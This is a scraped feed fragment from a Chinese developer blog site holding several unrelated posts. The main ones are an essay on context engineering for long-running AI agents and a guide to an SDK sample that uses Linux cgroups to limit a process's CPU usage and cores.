<p>目前对于LLM和AI Agent的使用，大家都是在一边摸索一边前行，比如探索如何把这些功能拼到一起，如何提供良好的体验，如何保证系统的鲁棒性等。除了几种最基础的方式之外，还没有哪一种Agent构建方法成为主流标准。</p>
<p>即便是OpenAI的Swarm类库和微软的Autogen类库中推崇的一些概念，也没有得到普遍的认可，甚至是错误的Agent构建方法。</p>
<p>当进行Agent构建时，市面上已经有不少基础的脚手架项目，但真正拿它们来运用到生产项目中，还是有很长的距离。</p>
<h2 data-id="heading-2">长时运行Agent的构建理论</h2>
<p>长时运行Agent（Long-running Agents），通常是指AI能够跨多个会话、多次工具调用和多阶段产物，来完成一个目标。长时运行Agent更强调大模型的自治以及动态上下文的管理，需要AI Agent能够支持长时间的运行来解决问题，同时，还需要更好的自主规划与调度能力，选择行使用上下文的能力等。</p>
<p>另外，一个很重要的指标就是可靠性，Agent想要真正的可靠、长时间运行、以及保持连贯对话，就必须做一些额外的事来控制错误的累积。否则，一个小的错误，在后续步骤中放大，形成错误链，造成整个Agent工程的不可控。而可靠性的核心保障就是“上下文工程”。</p>
<h2 data-id="heading-3">上下文工程</h2>
<p>截至目前，市面上的大模型已经非常智能了，但就算最聪明的人，没有了解清楚自己被要求做什么的上下文，也无法高效工作。</p>
<p>“Prompt engineering”曾是LLM聊天机器人需要将任务以理想格式表达时的产物，而“上下文工程”则是下一个阶段。它的意义，是要在动态系统中自动完成这件事。这更微妙，基本上也是Agent工程师的首要工作。</p>
<p>举个常见的Agent例子：</p>
<ul>
<li>把自己的任务分解成几个部分；</li>
<li>启动子Agent处理这些部分；</li>
<li>最后把各部分结果合并起来</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6a1ad35358c40ce8240e8d82f3db95e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=bAsrlBeZRe8YpP6GFN8RYgAKouE%3D" alt="图1" loading="lazy"/></p>
<p>这种架构很有诱惑力，特别是在处理多个并行组件的任务时。不过，这种架构也非常脆弱，它的核心问题是：</p>
<p>假设所需的任务是“做一个Flappy Bird的克隆版”。任务会被拆分为两个子任务：子任务一是“做一个有绿色管道和碰撞盒的移动游戏背景”，子任务二是“做一个能上下移动的小鸟”。</p>
<p>结果，Subagent1 搞错了子任务，做出了一个看起来像超级马里奥兄弟的背景。Subagent2 实现了小鸟，但它既不像游戏素材，也没有 Flappy Bird 的移动方式。现在最终的 Agent 只能把这两个误解的结果拼到一起，变成一个尴尬的合成品。</p>
<p>也许这个例子有点生硬，但现实中的任务往往有许多细微层面，每一层都有可能被误解。</p>
<p>你可能会认为，简单的办法就是把原始任务内容也复制给Subagent作为上下文，这样它们就不会误解自己的子任务了。但别忘了，在实际生产系统中，Agent 往往涉及多轮对话，经常需要调用工具来决定如何拆解任务，很多细节都会影响对任务的解读。</p>
<p><strong>原则一：共享上下文，并且共享完整的Agent轨迹（trace），而不仅仅是单独的信息文本。</strong></p>
<p>现在对Agent架构进行下一步改进，这次要确保每个Agent都能获得前面Agent的完整上下文。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8458c5d65d254ba684756f9aba6b302d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=mq2Hqb%2BIbQHFaVcTVm5wvWIRacU%3D" alt="图2" loading="lazy"/></p>
<p>很遗憾，事情还没那么简单。当再次给Agent提出Flappy Bird的克隆任务时，最终可能得到的是一只小鸟和一个背景，但它们的视觉风格完全不同。Subagent1 和Subagent2 并不知道对方在做什么，所以各自完成的部分根本不统一。</p>
<p>Subagent1和Subagent2所采取的动作，都是基于各自不同且事先未明确规定的假设。</p>
<p><strong>原则二：动作会带来隐含的决策，而冲突的决策会带来糟糕的结果。</strong></p>
<p>原则一和原则二非常关键，几乎没有违背它们的理由，所以默认就应该排除任何不遵守这两个原则的Agent架构。也许你觉得这样有些局限，但其实还有很多可以探索的不同架构方式。</p>
<p>遵循这些原则最简单的方法，就是采用单线程、线性式的Agent：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bcf628fec56415b8f3dc3165887f3b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=JtEoAY6kHx232gNlAU7CyHgqqlU%3D" alt="图3" loading="lazy"/></p>
<p>在这种架构下，上下文是连续的。不过，如果任务非常庞大、包含大量子任务，可能会遇到上下文窗口溢出的情况。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8740fb520974bd9a8bb5bf25a066a84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=uNjhfARtBne2RX0qE2QSBbtqGt8%3D" alt="图4" loading="lazy"/></p>
<p>这种简单的架构已经能应对绝大多数场景，但如果你的任务真的需要长时间运行，并且你愿意投入更多精力，其实还可以做得更好。</p>
<p>比如：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bb2aa9ec5994d66a024fe8b0ff1f408~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5paw6KeG55WM:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768479646&amp;x-signature=sZ6PTxoj6SNtRlnVQGwtDiFmFB0%3D" alt="图5" loading="lazy"/></p>
<p>在这个架构中，引入了一个新的 LLM 模型，其核心作用是将一系列的动作和对话历史压缩成关键细节、事件和决策。</p>
<p>这其实很难做好，需要投入精力搞清楚哪些才是真正重要的信息，并搭建一个模型擅长识别这些内容的系统。根据不同领域，甚至可能需要微调一个更小的模型。</p>
<p>这样做的好处是，可以让Agent在更长的上下文中仍然高效工作。当然，最终还是会遇到上下文长度的极限。</p>
<h2 data-id="heading-4">原则的应用案例</h2>
<p>作为Agent的开发者，要确保Agent的每一步操作都参考了系统其它部分已经做出的所有相关决策的上下文。理想情况下，每个动作都能“看到”其它所有动作的信息。</p>
<p>可惜，受限于上下文窗口和实际工程权衡，这往往做不到，需要结合可靠性目标，决定Agent能接受多复杂的架构。</p>
<p>在思考如何架构Agent、避免冲突决策时，这里有一些真实案例可以参考：</p>
<h3 data-id="heading-5">Claude Code 子Agent</h3>
<p>Claude Code是一个能够生成子任务的 Agent 示例。不过，它不会跟子Agent并行做事，而且子Agent通常只是被要求回答一个问题，不会去写任何代码。</p>
<p>为什么？因为子Agent缺少主Agent的上下文，除了回答那些定义非常清晰的问题，其他任务就无法做。而如果让多个并行的子Agent协作，结果可能互相冲突，导致在Agent架构上遇到之前说的可靠性问题。</p>
<p>在Claude Code的设计里，子Agent的全部调研工作不需要留在主Agent的历史记录中，这样可以更长时间保留上下文。设计者刻意采用了简化方案。</p>
<h3 data-id="heading-6">Edit Apply 模型</h3>
<p>2024年，许多模型在编辑代码上的表现非常差。很多Coding Agent、IDE、App Builder 等（包括 Devin），都采用了“edit apply model”（编辑应用模型）。</p>
<p>核心思路是，与其让大模型输出格式正确的diff，不如让小模型根据Markdown格式的编辑说明重写整个文件来得可靠。</p>
<p>所以实际操作中，开发者让大模型输出Markdown说明代码改动，然后把这些说明交给小模型来重写文件。但这种系统仍然容易出错。比如，小模型可能会错误理解大模型的指令，只要指令中稍有歧义，就会导致错误编辑。现在，代码编辑和应用更多是由一个模型一步完成。</p>
<h3 data-id="heading-7">多 Agent 协作</h3>
<p>如果真要让系统并行处理任务，你可能也会想到让决策者之间“互相沟通”共同解决问题。</p>
<p>这也是人类遇到分歧（理想情况下）会做的事。如果工程师 A 的代码与工程师 B 的代码发生合并冲突，标准流程就是大家相互交流，达成一致。但时至今日，AI Agent之间尚不具备像人一样，能在超长上下文下高可靠性地主动沟通。</p>
<p>自从ChatGPT推出后，大家一直在探索多 Agent 交互协作来解决问题。从长期来看，Agent协作的长期很乐观，但目前多Agent协作系统还是非常脆弱。还存在决策太分散，Agent之间上下文也无法充分共享等问题。</p>
<p>当然，未来单线程Agent和人类沟通越来越顺畅后，这个难题自然而然就会解决。那时候会彻底释放更高并行度和效率。</p>
<h2 data-id="heading-8">小结</h2>
<p>这些关于上下文工程的观察和讨论，只是未来成为Agent构建标准原则的一个起点。实际上还有很多各种挑战和技术没讨论。同时，Agent构建也是非常重要的前沿方向。</p>
<p>我们在实践中，可以利用本文提到的一些原则和解决方案，指导内部工具和框架的开发，通过实践和总结来不断完善Agent工程的落地。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[征程 6 | cgroup sample]]></title>    <link>https://juejin.cn/post/7592622563547004963</link>    <guid>https://juejin.cn/post/7592622563547004963</guid>    <pubDate>2026-01-08T12:24:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592622563547004963" data-draft-id="7592637149697572899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="征程 6 | cgroup sample"/> <meta itemprop="keywords" content="自动驾驶,算法"/> <meta itemprop="datePublished" content="2026-01-08T12:24:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="地平线开发者"/> <meta itemprop="url" content="https://juejin.cn/user/1257497032132567"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            征程 6 | cgroup sample
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1257497032132567/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    地平线开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:24:38.000Z" title="Thu Jan 08 2026 12:24:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 功能概述</h2>
<p>本 sample 实现限制进程 cpu 占用率和运行的 cpu 核功能，此处主要介绍该 sample 的实现与使用方法。</p>
<h3 data-id="heading-1">1.1. 软件架构说明</h3>
<p>本 sample 基于 Linux 通用的 cgroup API，通过操作 cgroup 的 cpu 子系统和 cpuset 子系统配置文件，来限制 sample 进程的 cpu 占用率和运行的 cpu 核。</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NWFiMWM1MmNjMzAyN2Q0MmUyNzYzNDkzZjQ5ODUxZGVfRTV0M014ZjFKd0JIY1ZVMDlNVGJsQnZLYm8yV3lGR3JfVG9rZW46UmozYmI1MGJib1lDa0p4ZjRwamNpMlI3bjdjXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">1.2. 代码位置与目录结构</h3>
<p>本 sample 代码位置和目录结构如下：</p>
<p>代码位置如下：</p>
<pre><code class="hljs language-markdown" lang="markdown">{sdk<span class="hljs-emphasis">_dir}/test/samples/platform_</span>samples/source/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample
</span></code></pre>
<p>目录结构如下：</p>
<pre><code class="hljs language-markdown" lang="markdown">├── Kconfig
├── Makefile
├── Makefile.in
└── src
<span class="hljs-code">    ├── cgroup_sample.c
    └── Makefile
</span></code></pre>
<h3 data-id="heading-3">1.3. API 流程说明</h3>
<p>以下为 sample 内 API 调用流程图：</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NDE1MmJkYjYxOWZjYzZmYTI4ODNiNDViNmMwMDlhNDlfNGF5YUZ0OWxlbG1XeEx5cEVESVRhR2h0Szd0UVF1QU5fVG9rZW46R1dncmJLNGFWbzVpSzN4VXBtN2NhcDEybjdiXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">2. 编译</h2>
<h3 data-id="heading-5">2.1. 编译环境</h3>
<p>本 sample 的编译环境使用 SDK 中的 build 工具，请参考： <a href="https://link.juejin.cn?target=http%3A%2F%2F10.106.32.73%2Fdoc%2FLNX-PL4.0-WB-20250724-J6P%2Fcn%2Fhtml%2Fj6_sysdev%2Fbuild%2Fj6_sysdev_build.html%23id1" target="_blank" title="http://10.106.32.73/doc/LNX-PL4.0-WB-20250724-J6P/cn/html/j6_sysdev/build/j6_sysdev_build.html#id1" ref="nofollow noopener noreferrer">Build 环境建立</a>。</p>
<h3 data-id="heading-6">2.2. 编译说明</h3>
<p>本 sample 的编译依赖封装 Linux cgroup API 链接库 libhbcgroup 提供的头文件：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">#include "hb<span class="hljs-emphasis">_cgroup.h"
</span></span></code></pre>
<p>编译依赖的库为：</p>
<pre><code class="hljs language-markdown" lang="markdown">LIBS += -lhbcgroup
</code></pre>
<p>编译命令：</p>
<pre><code class="hljs language-markdown" lang="markdown">进入SDK所有目录{sdk<span class="hljs-emphasis">_dir}，并source构建环境（参见上文：编译环境）。# 编译本sample:
bdm cgroup_</span>sample
<span class="hljs-section"># 输出路径:{sdk<span class="hljs-emphasis">_dir}/out/debug-gcc_</span>{gcc<span class="hljs-emphasis">_version}/build/test/samples/platform_</span>samples/source/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample
</span></span></code></pre>
<h2 data-id="heading-7">3. 运行</h2>
<h3 data-id="heading-8">3.1. 支持平台</h3>
<p>征程 6X Matrix</p>
<h3 data-id="heading-9">3.2. 板端部署及配置</h3>
<p>本 sample 的可执行文件位于板端如下路径：</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample
</code></pre>
<h3 data-id="heading-10">3.3. 运行指南</h3>
<h4 data-id="heading-11">3.3.1. <strong>运行参数说明</strong></h4>
<p>下面的表格是 cgroup_sample 具体参数的说明：</p>
<p>如果-c 和-C 都不选择，则不会限制 cgroup_sample 进程的 cpu 占用率和运行的 cpu 核。</p>
<h4 data-id="heading-12">3.3.2. <strong>帮助菜单</strong></h4>
<pre><code class="hljs language-markdown" lang="markdown">Usage: cgroup<span class="hljs-emphasis">_sample [OPTION]

-c  Limit cpu occupancy rate, 1 ~ 100.
-C  Limit cpu core.
-t  Delay time, 1's default.
-h  Show usage.

Without options, do nothing.
</span></code></pre>
<h4 data-id="heading-13">3.3.3. <strong>运行方法</strong></h4>
<p>执行命令示例：</p>
<p>限制 cgroup_sample 进程的 cpu 占用率为 20%：</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20
</code></pre>
<p>限制 cgroup_sample 进程只运行在 cpu 核 2：</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -C 2
</code></pre>
<p>限制 cgroup_sample 进程运行在 cpu 核 1，4：</p>
<pre><code class="hljs language-markdown" lang="markdown">/app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -C 1,4
</code></pre>
<h4 data-id="heading-14">3.3.4. <strong>运行结果说明</strong></h4>
<p>运行本 sample 后，可通过 top 命令验证本 sample 进程的 cpu 占用率和运行的 cpu 核。</p>
<p><strong>运行结果 1</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">root@hobot:~# /app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20 -C 2 -t 20 &amp;[1] 1514
</code></pre>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=NzIyODNhZjNmZTkxZDZlYmRhNjZiMWI5Mjg5MzdmMDZfbTgycU9heVQ5aWdHM002Z3ltQUxXaXk1c0NDNnFFUmxfVG9rZW46UGM5RGJkcERsbzRTdFd4ZnFtUmNQS0RYblZoXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<p><strong>运行结果 2</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">root@hobot:~# /app/sample/S83<span class="hljs-emphasis">_Sample/S83E03_</span>BaseService/cgroup<span class="hljs-emphasis">_sample/bin/cgroup_</span>sample -c 20 -C 1,4 -t 20 &amp;[1] 1522
</code></pre>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=MGUwY2MzNjE1MjQ0OTc0YjUxMDg2YmNiOWQ5YjFmYjRfVVdVd09oMXkxRDl4MlpQb2FhTjVPU1pUVjB3NUVqTWJfVG9rZW46SExTRWJqSkxQb0RoVlR4WTZiU2NMTnlibnBoXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p>
<p><strong>特别说明</strong></p>
<p>查看 cpu 核，在执行 top 命令后，需进行如下操作：</p>
<ol>
<li>按 f 键，弹出管理窗口；</li>
<li>按上下键选择下图指示的属性 P；</li>
<li>按空格键选中该属性（选中后会高亮）；</li>
<li>按 q 键退出；</li>
</ol>
<p>即可显示进程运行的 cpu 核。</p>
<p><img src="https://mcnsakkce4vm.feishu.cn/space/api/box/stream/download/asynccode/?code=MWEzYmUzNGEwZDFiOGNmODA1ZjBhZTEzM2RmMTg0NmFfWWIzNk1CR0JHNVAxT0RYOEtSUWdsTGdybGxrbnlJeFdfVG9rZW46VzRIcWIzWGJIb2l6YlN4bGxESWNURXNhbmxiXzE3Njc4NzQ1ODA6MTc2Nzg3ODE4MF9WNA" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从一道前端面试题，谈 JS 对象存储特点和运算符执行顺序]]></title>    <link>https://juejin.cn/post/7592637149697622051</link>    <guid>https://juejin.cn/post/7592637149697622051</guid>    <pubDate>2026-01-08T12:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592637149697622051" data-draft-id="7592856733182607396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从一道前端面试题，谈 JS 对象存储特点和运算符执行顺序"/> <meta itemprop="keywords" content="前端,面试,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T12:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小寒"/> <meta itemprop="url" content="https://juejin.cn/user/694547078987287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从一道前端面试题，谈 JS 对象存储特点和运算符执行顺序
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547078987287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小寒
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:44:56.000Z" title="Thu Jan 08 2026 12:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 